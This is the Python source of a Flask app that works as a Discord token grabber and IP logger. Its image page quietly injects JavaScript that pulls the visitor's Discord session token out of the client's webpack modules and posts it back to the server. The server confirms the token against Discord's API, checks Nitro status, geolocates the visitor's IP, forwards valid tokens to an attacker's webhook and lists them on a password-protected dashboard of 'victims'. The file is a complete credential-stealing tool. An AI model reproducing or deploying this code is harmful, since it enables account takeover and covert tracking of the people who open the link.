import os
from flask import Flask, request, Response, jsonify, render_template_string
import json
import base64
import requests
from datetime import datetime
import threading

app = Flask(__name__)

# --- CONFIGURATION (via Environment Variables) ---
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin')

# In-memory logs for session tracking on Vercel
MEMORY_LOGS = []

# 1x1 transparent PNG
PIXEL_PNG = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==")
IMAGE_URL = "https://imgs.search.brave.com/B00Bfn1lTaKo5VfpF5-9V3A2IRhj8qT8yddHLKe_u7c/rs:fit:500:0:1:0/g:ce/aHR0cHM6Ly9tZWRp/YS5nZXR0eWltYWdl/cy5jb20vaWQvNjU4/Nzg2OTMwL3Bob3Rv/L2xvcy1hbmdlbGVz/LWNhLXNlYW4tcC1k/aWRkeS1jb21icy1h/bmQtNTAtY2VudC1h/dHRlbmQtY2xpdmUt/ZGF2aXMtcHJlLWdy/YW1teS1hd2FyZHMt/cGFydHktYXQuanBn/P3M9NjEyeDYxMiZ3/PTAmaz0yMCZjPTVP/UlBPZjRxd011SWcx/eC11eHlkTVFQcllZ/NHMtdEhsY0ZSUmJS/NWQ2UWM9"

def send_webhook(data):
    if not WEBHOOK_URL: return
    user = data.get('discord_user', {})
    username = f"{user.get('username', 'Unknown')}#{user.get('discriminator', '0000')}"
    user_id = user.get('id', 'N/A')
    avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user.get('avatar')}.png" if user.get('avatar') else None
    
    embed = {
        "title": "🎯 Vercel Hit Captured!",
        "color": 0x5865F2,
        "fields": [
            {"name": "👤 User", "value": f"**{username}** (`{user_id}`)", "inline": True},
            {"name": "🌐 IP", "value": f"`{data['ip']}` ({data['geo'].get('country', 'Unknown')})", "inline": True},
            {"name": "🎟️ Nitro", "value": f"{'✅' if data.get('has_nitro') else '❌'}", "inline": True},
            {"name": "🔑 Token", "value": f"```\n{data['discord_token']}\n```", "inline": False}
        ],
        "footer": {"text": f"Captured at {data['timestamp']} | Vercel Serverless"}
    }
    if avatar: embed["thumbnail"] = {"url": avatar}
    try: requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
    except: pass

def get_geolocation(ip):
    try:
        resp = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        return resp.json() if resp.status_code == 200 else {}
    except: return {}

def validate_token(token):
    res = {'valid': False, 'user': None, 'nitro': False}
    headers = {'Authorization': token}
    try:
        u_resp = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
        if u_resp.status_code == 200:
            res['valid'] = True
            res['user'] = u_resp.json()
            n_resp = requests.get('https://discord.com/api/v9/users/@me/billing/subscriptions', headers=headers, timeout=5)
            res['nitro'] = len(n_resp.json()) > 0 if n_resp.status_code == 200 else False
    except: pass
    return res

@app.route('/')
@app.route('/logger.png')
def logger_route():
    ua = request.headers.get('User-Agent', '').lower()
    if any(b in ua for b in ['bot', 'crawl', 'spider']): return Response(PIXEL_PNG, mimetype='image/png')
    
    js = f'''<script>(async()=>{{
    const d={{ua:navigator.userAgent,sc:`${{screen.width}}x${{screen.height}}`,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,ref:document.referrer}};
    try{{
        const r=window.webpackChunkdiscord_app.push([[Math.random()],{{}},r=>r]);
        window.webpackChunkdiscord_app.pop();
        for(let m of Object.values(r.c)){{if(m?.exports?.default?.getToken){{d.token=m.exports.default.getToken();break;}}}}
    }}catch{{}}
    fetch("/grab",{{method:"POST",headers:{{ "Content-Type":"application/json" }},body:JSON.stringify(d)}});
}})();</script>'''
    html = f'<html><body style="margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh"><img src="{IMAGE_URL}" style="max-width:100%;max-height:100%">{js}</body></html>'
    return Response(html, mimetype='text/html')

@app.route('/grab', methods=['POST'])
def grab_route():
    data = request.get_json() or {}
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    val = validate_token(data.get('token')) if data.get('token') else {'valid': False}
    victim = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip': ip, 'geo': get_geolocation(ip), 'ua': data.get('ua'),
        'discord_token': data.get('token'), 'token_valid': val['valid'],
        'discord_user': val['user'], 'has_nitro': val['nitro']
    }
    MEMORY_LOGS.append(victim)
    if victim['token_valid']: threading.Thread(target=send_webhook, args=(victim,)).start()
    return jsonify({'status': 'ok'})

@app.route('/dashboard')
def dashboard_route():
    if request.args.get('p') != ADMIN_PASSWORD: return "Unauthorized", 401
    html = '''
    <!DOCTYPE html><html><head><title>Vercel L00ger</title>
    <style>body{font-family:sans-serif;background:#0f0f13;color:#eee;padding:20px;}table{width:100%;border-collapse:collapse;background:#1a1a24;}.valid{color:#43b581;}th,td{padding:10px;border-bottom:1px solid #333;text-align:left;}th{background:#5865F2;}</style>
    </head><body><h1>🎯 Vercel L00ger - Realtime</h1><table><tr><th>Time</th><th>IP</th><th>User</th><th>Token</th></tr>
    {% for e in logs[::-1] %}<tr><td>{{e.timestamp}}</td><td>{{e.ip}}<br><small>{{e.geo.city}}</small></td><td>{{e.discord_user.username if e.discord_user else 'N/A'}}</td><td style="font-family:monospace">{{e.discord_token}}</td></tr>{% endfor %}
    </table><p><small>Note: Logs reset when Vercel scales down.</small></p></body></html>
    '''
    return render_template_string(html, logs=MEMORY_LOGS)

if __name__ == '__main__':
    app.run(debug=True)
